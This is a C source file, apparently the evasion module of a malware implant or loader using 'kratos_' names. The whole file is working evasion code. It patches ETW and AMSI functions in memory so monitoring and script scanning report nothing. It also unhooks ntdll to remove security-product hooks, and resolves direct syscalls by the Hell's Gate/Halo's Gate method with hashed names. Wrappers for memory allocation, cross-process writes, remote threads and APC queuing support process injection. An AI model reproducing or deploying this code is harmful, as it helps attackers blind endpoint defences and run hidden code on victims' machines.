#define _WIN32_WINNT 0x0600
#define WIN32_NO_STATUS
#include "evasion.h"
#include <windows.h>
#include <winnt.h>
#include <string.h>
#include <stdio.h>

/* ===================================================================
 * Shared helper: patch bytes with RW/RX toggle
 * ================================================================= */
static BOOL patch_bytes(LPVOID addr, const BYTE *src, SIZE_T len) {
    DWORD old = 0;
    if (!VirtualProtect(addr, len, PAGE_EXECUTE_READWRITE, &old)) return FALSE;
    memcpy(addr, src, len);
    VirtualProtect(addr, len, old, &old);
    FlushInstructionCache(GetCurrentProcess(), addr, len);
    return TRUE;
}

/* ===================================================================
 * 1. ETW PATCH
 *    xor rax,rax (48 33 C0) + ret (C3)  →  EtwEventWrite returns 0
 * ================================================================= */
#ifdef EVASION_ETW
static void patch_etw(void) {
    static const BYTE stub[] = { 0x48, 0x33, 0xC0, 0xC3 };
    HMODULE h = GetModuleHandleA("ntdll.dll");
    if (!h) return;
    const char *names[] = {
        "EtwEventWrite", "EtwEventWriteFull",
        "EtwEventWriteTransfer", "EtwEventRegister", NULL
    };
    for (int i = 0; names[i]; i++) {
        FARPROC fn = GetProcAddress(h, names[i]);
        if (fn) patch_bytes((LPVOID)fn, stub, sizeof(stub));
    }
}
#endif

/* ===================================================================
 * 2. AMSI PATCH
 *    mov eax, E_INVALIDARG (B8 57 00 07 80) + ret (C3)
 *    AmsiScanBuffer returns "clean" to any caller (PS, VBA, etc.)
 * ================================================================= */
#ifdef EVASION_AMSI
static void patch_amsi(void) {
    static const BYTE stub[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    HMODULE h = GetModuleHandleA("amsi.dll");
    if (!h) h = LoadLibraryA("amsi.dll");
    if (!h) return;
    const char *names[] = { "AmsiScanBuffer", "AmsiScanString", NULL };
    for (int i = 0; names[i]; i++) {
        FARPROC fn = GetProcAddress(h, names[i]);
        if (fn) patch_bytes((LPVOID)fn, stub, sizeof(stub));
    }
}
#endif

/* ===================================================================
 * 3. NTDLL UNHOOKING
 *    Map a fresh ntdll from disk (SEC_IMAGE), copy every executable
 *    read-only section over the hooked in-memory version.
 * ================================================================= */
#ifdef EVASION_UNHOOK
static void unhook_ntdll(void) {
    char path[MAX_PATH];
    GetSystemDirectoryA(path, sizeof(path));
    strncat(path, "\\ntdll.dll", sizeof(path) - strlen(path) - 1);

    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;

    HANDLE hMap = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    CloseHandle(hFile);
    if (!hMap) return;

    LPVOID clean = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    CloseHandle(hMap);
    if (!clean) return;

    HMODULE hooked = GetModuleHandleA("ntdll.dll");
    if (!hooked) { UnmapViewOfFile(clean); return; }

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)clean;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((BYTE*)clean + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        /* Only copy executable non-writable sections (.text) */
        DWORD ch = sec->Characteristics;
        if (!(ch & IMAGE_SCN_MEM_EXECUTE)) continue;
        if (  ch & IMAGE_SCN_MEM_WRITE)    continue;

        LPVOID dst = (BYTE*)hooked + sec->VirtualAddress;
        LPVOID src = (BYTE*)clean  + sec->VirtualAddress;
        SIZE_T sz  = sec->Misc.VirtualSize;

        DWORD old = 0;
        if (VirtualProtect(dst, sz, PAGE_EXECUTE_WRITECOPY, &old)) {
            memcpy(dst, src, sz);
            VirtualProtect(dst, sz, old, &old);
            FlushInstructionCache(GetCurrentProcess(), dst, sz);
        }
    }
    UnmapViewOfFile(clean);
}
#endif

/* ===================================================================
 * 4. DIRECT SYSCALLS  (Hell's Gate + Halo's Gate + .S GAS stub)
 *
 *  Strategy:
 *   - Locate ntdll base via PEB walk (no GetModuleHandleA).
 *   - Parse ntdll EAT once; cache sorted Nt* array permanently.
 *   - Name lookup uses CRC32 hash comparison; wrappers pass pre-computed
 *     hash constants from nt_hashes.h (no plaintext NT strings in .rodata).
 *   - A clean stub starts with:  4C 8B D1  B8 XX 00 00 00
 *                                mov r10,rcx  mov eax, SSN
 *   - Hook scenario 1 (E9 at byte 0) or 2 (E9 at byte 3): Halo's Gate
 *     walks sorted neighbours to infer the SSN.
 *   - Execute via syscall_stub.S (do_syscall in .text, wSystemCall in .data).
 *     No VirtualAlloc, no VirtualProtect, no heap trampoline, no RWX.
 * ================================================================= */
#ifdef EVASION_SYSCALLS
#include "nt_hashes.h"

/* ---- EAT entry --------------------------------------------------- */
typedef struct { DWORD rva; DWORD idx; } ExportEntry;

/* ---- CRC32 hash (SEED = 0xEDB88320) ------------------------------ */
static DWORD kratos_crc32h(const char *s) {
    DWORD crc = 0xFFFFFFFFU;
    while (*s) {
        crc ^= (DWORD)(unsigned char)*s++;
        for (int i = 0; i < 8; i++)
            crc = (crc >> 1) ^ (0xEDB88320U & (DWORD)(-(int)(crc & 1)));
    }
    return ~crc;
}

/* ---- ntdll base via PEB walk (no kernel32 call) ------------------ */
static ULONG_PTR kratos_ntdll_base(void) {
    ULONG_PTR peb;
    __asm__ volatile ("movq %%gs:0x60, %0" : "=r"(peb));
    /* PEB+0x18 = Ldr, Ldr+0x20 = InMemoryOrderModuleList.Flink        */
    /* Skip first entry (our image), second entry is ntdll              */
    /* DllBase = (InMemoryOrderLinks ptr - 0x10) + 0x30 = ptr + 0x20   */
    ULONG_PTR ldr    = *(ULONG_PTR*)(peb  + 0x18);
    ULONG_PTR flink1 = *(ULONG_PTR*)(ldr  + 0x20);
    ULONG_PTR flink2 = *(ULONG_PTR*)flink1;
    return             *(ULONG_PTR*)(flink2 + 0x20);
}

/* ---- Cached NTDLL config ----------------------------------------- */
typedef struct {
    ULONG_PTR   uModule;
    PDWORD      pdwNames;
    PDWORD      pdwAddresses;
    PWORD       pwOrdinals;
    DWORD       dwNameCount;
    ExportEntry *nt_sorted;
    DWORD       nt_count;
} KRATOS_NTDLL_CONF;

static KRATOS_NTDLL_CONF g_ntdll_conf = { 0 };

static BOOL kratos_init_ntdll_conf(void) {
    if (g_ntdll_conf.uModule) return TRUE;

    ULONG_PTR base = kratos_ntdll_base();
    if (!base) return FALSE;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    DWORD eat_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!eat_rva) return FALSE;

    PIMAGE_EXPORT_DIRECTORY eat = (PIMAGE_EXPORT_DIRECTORY)(base + eat_rva);
    g_ntdll_conf.uModule      = base;
    g_ntdll_conf.dwNameCount  = eat->NumberOfNames;
    g_ntdll_conf.pdwNames     = (PDWORD)(base + eat->AddressOfNames);
    g_ntdll_conf.pdwAddresses = (PDWORD)(base + eat->AddressOfFunctions);
    g_ntdll_conf.pwOrdinals   = (PWORD) (base + eat->AddressOfNameOrdinals);

    /* Build + sort Nt* export array once - reused for every SSN lookup */
    ExportEntry *tmp = (ExportEntry*)HeapAlloc(GetProcessHeap(), 0,
                                                eat->NumberOfNames * sizeof(ExportEntry));
    if (!tmp) return FALSE;

    DWORD count = 0;
    for (DWORD i = 0; i < eat->NumberOfNames; i++) {
        const char *name = (const char*)(base + g_ntdll_conf.pdwNames[i]);
        if (name[0] == 'N' && name[1] == 't') {
            tmp[count].rva = g_ntdll_conf.pdwAddresses[g_ntdll_conf.pwOrdinals[i]];
            tmp[count].idx = i;
            count++;
        }
    }
    for (DWORD i = 1; i < count; i++) {
        ExportEntry key = tmp[i];
        int j = (int)i - 1;
        while (j >= 0 && tmp[j].rva > key.rva) { tmp[j+1] = tmp[j]; j--; }
        tmp[j+1] = key;
    }
    g_ntdll_conf.nt_sorted = tmp;
    g_ntdll_conf.nt_count  = count;
    return TRUE;
}

/* ---- SSN resolver (cache + CRC32) -------------------------------- */
DWORD kratos_resolve_ssn_hash(DWORD hash) {
    if (!kratos_init_ntdll_conf()) return (DWORD)-1;

    BYTE *base = (BYTE*)g_ntdll_conf.uModule;

    DWORD target_pos = (DWORD)-1;
    for (DWORD i = 0; i < g_ntdll_conf.nt_count; i++) {
        const char *name = (const char*)(base + g_ntdll_conf.pdwNames[g_ntdll_conf.nt_sorted[i].idx]);
        if (kratos_crc32h(name) == hash) { target_pos = i; break; }
    }
    if (target_pos == (DWORD)-1) return (DWORD)-1;

    DWORD ssn  = (DWORD)-1;
    BYTE *stub = base + g_ntdll_conf.nt_sorted[target_pos].rva;

#define CLEAN_STUB(s) ((s)[0]==0x4C&&(s)[1]==0x8B&&(s)[2]==0xD1&&(s)[3]==0xB8&&(s)[6]==0x00&&(s)[7]==0x00)

    if (CLEAN_STUB(stub)) {
        ssn = *(DWORD*)(stub + 4);
    } else if (stub[0]==0xE9 || stub[3]==0xE9) {
        for (DWORD d = 1; d < g_ntdll_conf.nt_count; d++) {
            if (target_pos >= d) {
                BYTE *s = base + g_ntdll_conf.nt_sorted[target_pos - d].rva;
                if (CLEAN_STUB(s)) { ssn = *(DWORD*)(s+4) + d; break; }
            }
            if (target_pos + d < g_ntdll_conf.nt_count) {
                BYTE *s = base + g_ntdll_conf.nt_sorted[target_pos + d].rva;
                if (CLEAN_STUB(s)) { ssn = *(DWORD*)(s+4) - d; break; }
            }
        }
    } else {
        for (DWORD d = 1; d < g_ntdll_conf.nt_count; d++) {
            if (target_pos >= d) {
                BYTE *s = base + g_ntdll_conf.nt_sorted[target_pos - d].rva;
                if (CLEAN_STUB(s)) { ssn = *(DWORD*)(s+4) + d; break; }
            }
            if (target_pos + d < g_ntdll_conf.nt_count) {
                BYTE *s = base + g_ntdll_conf.nt_sorted[target_pos + d].rva;
                if (CLEAN_STUB(s)) { ssn = *(DWORD*)(s+4) - d; break; }
            }
        }
    }
#undef CLEAN_STUB
    return ssn;
}

/* Convenience wrapper for external callers that still pass a string */
DWORD kratos_resolve_ssn(const char *func_name) {
    return kratos_resolve_ssn_hash(kratos_crc32h(func_name));
}

/* ---- Typed wrappers ---------------------------------------------- */
/* wSystemCall and do_syscall are defined in syscall_stub.S:
 *   wSystemCall -> DWORD in .data  (set before each call)
 *   do_syscall  -> .text stub:  mov r10,rcx / mov eax,[wSystemCall] / syscall / ret
 * No VirtualAlloc, no VirtualProtect, no heap, no RWX. */

NTSTATUS kratos_NtAllocateVirtualMemory(HANDLE Process, PVOID *BaseAddress,
                                        ULONG_PTR ZeroBits, PSIZE_T RegionSize,
                                        ULONG AllocationType, ULONG Protect) {
    static DWORD ssn = (DWORD)-1;
    if (ssn == (DWORD)-1) ssn = kratos_resolve_ssn_hash(HASH_NtAllocateVirtualMemory);
    if (ssn == (DWORD)-1) return (NTSTATUS)0xC0000001;
    wSystemCall = ssn;
    typedef NTSTATUS (NTAPI *fn_t)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
    return ((fn_t)do_syscall)(Process, BaseAddress, ZeroBits, RegionSize,
                              AllocationType, Protect);
}

NTSTATUS kratos_NtProtectVirtualMemory(HANDLE Process, PVOID *BaseAddress,
                                       PSIZE_T RegionSize, ULONG NewProtect,
                                       PULONG OldProtect) {
    static DWORD ssn = (DWORD)-1;
    if (ssn == (DWORD)-1) ssn = kratos_resolve_ssn_hash(HASH_NtProtectVirtualMemory);
    if (ssn == (DWORD)-1) return (NTSTATUS)0xC0000001;
    wSystemCall = ssn;
    typedef NTSTATUS (NTAPI *fn_t)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
    return ((fn_t)do_syscall)(Process, BaseAddress, RegionSize, NewProtect, OldProtect);
}

NTSTATUS kratos_NtCreateThreadEx(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess,
                                 PVOID ObjectAttributes, HANDLE ProcessHandle,
                                 PVOID StartRoutine, PVOID Argument,
                                 ULONG CreateFlags, SIZE_T ZeroBits,
                                 SIZE_T StackSize, SIZE_T MaximumStackSize,
                                 PVOID AttributeList) {
    static DWORD ssn = (DWORD)-1;
    if (ssn == (DWORD)-1) ssn = kratos_resolve_ssn_hash(HASH_NtCreateThreadEx);
    if (ssn == (DWORD)-1) return (NTSTATUS)0xC0000001;
    wSystemCall = ssn;
    typedef NTSTATUS (NTAPI *fn_t)(PHANDLE, ACCESS_MASK, PVOID, HANDLE,
                                   PVOID, PVOID, ULONG, SIZE_T, SIZE_T,
                                   SIZE_T, PVOID);
    return ((fn_t)do_syscall)(ThreadHandle, DesiredAccess, ObjectAttributes,
                              ProcessHandle, StartRoutine, Argument, CreateFlags,
                              ZeroBits, StackSize, MaximumStackSize, AttributeList);
}

NTSTATUS kratos_NtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress,
                                     PVOID Buffer, SIZE_T NumberOfBytesToWrite,
                                     PSIZE_T NumberOfBytesWritten) {
    static DWORD ssn = (DWORD)-1;
    if (ssn == (DWORD)-1) ssn = kratos_resolve_ssn_hash(HASH_NtWriteVirtualMemory);
    if (ssn == (DWORD)-1) return (NTSTATUS)0xC0000001;
    wSystemCall = ssn;
    typedef NTSTATUS (NTAPI *fn_t)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
    return ((fn_t)do_syscall)(ProcessHandle, BaseAddress, Buffer,
                              NumberOfBytesToWrite, NumberOfBytesWritten);
}

NTSTATUS kratos_NtQueueApcThread(HANDLE ThreadHandle, PVOID ApcRoutine,
                                  PVOID ApcArgument1, PVOID ApcArgument2,
                                  PVOID ApcArgument3) {
    static DWORD ssn = (DWORD)-1;
    if (ssn == (DWORD)-1) ssn = kratos_resolve_ssn_hash(HASH_NtQueueApcThread);
    if (ssn == (DWORD)-1) return (NTSTATUS)0xC0000001;
    wSystemCall = ssn;
    typedef NTSTATUS (NTAPI *fn_t)(HANDLE, PVOID, PVOID, PVOID, PVOID);
    return ((fn_t)do_syscall)(ThreadHandle, ApcRoutine, ApcArgument1,
                              ApcArgument2, ApcArgument3);
}

/* ---- Internal NT structs for NtOpenProcess ----------------------- */
typedef struct {
    ULONG  Length;
    HANDLE RootDirectory;
    PVOID  ObjectName;
    ULONG  Attributes;
    PVOID  SecurityDescriptor;
    PVOID  SecurityQualityOfService;
} KRATOS_OA;

typedef struct {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} KRATOS_CID;

NTSTATUS kratos_NtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess,
                               DWORD Pid) {
    static DWORD ssn = (DWORD)-1;
    if (ssn == (DWORD)-1) ssn = kratos_resolve_ssn_hash(HASH_NtOpenProcess);
    if (ssn == (DWORD)-1) return (NTSTATUS)0xC0000001;
    wSystemCall = ssn;
    KRATOS_OA  oa  = { sizeof(KRATOS_OA), NULL, NULL, 0, NULL, NULL };
    KRATOS_CID cid = { (HANDLE)(ULONG_PTR)Pid, NULL };
    typedef NTSTATUS (NTAPI *fn_t)(PHANDLE, ACCESS_MASK, KRATOS_OA*, KRATOS_CID*);
    return ((fn_t)do_syscall)(ProcessHandle, DesiredAccess, &oa, &cid);
}

NTSTATUS kratos_NtOpenProcessToken(HANDLE ProcessHandle, ACCESS_MASK DesiredAccess,
                                    PHANDLE TokenHandle) {
    static DWORD ssn = (DWORD)-1;
    if (ssn == (DWORD)-1) ssn = kratos_resolve_ssn_hash(HASH_NtOpenProcessToken);
    if (ssn == (DWORD)-1) return (NTSTATUS)0xC0000001;
    wSystemCall = ssn;
    typedef NTSTATUS (NTAPI *fn_t)(HANDLE, ACCESS_MASK, PHANDLE);
    return ((fn_t)do_syscall)(ProcessHandle, DesiredAccess, TokenHandle);
}

static void init_syscalls(void) {
    /* Parse ntdll EAT once via PEB walk, cache the sorted Nt* array.
     * Wrapper SSNs are resolved lazily on first call via hash lookup. */
    kratos_init_ntdll_conf();
}
#endif /* EVASION_SYSCALLS */

/* ===================================================================
 * Public entry point
 * ================================================================= */
void kratos_evasion_init(void) {
#ifdef EVASION_UNHOOK
    unhook_ntdll();   /* first: remove hooks so patches land on clean stubs */
#endif
#ifdef EVASION_ETW
    patch_etw();
#endif
#ifdef EVASION_AMSI
    patch_amsi();
#endif
#ifdef EVASION_SYSCALLS
    init_syscalls();  /* resolve + cache SSNs while ntdll is accessible */
#endif
}
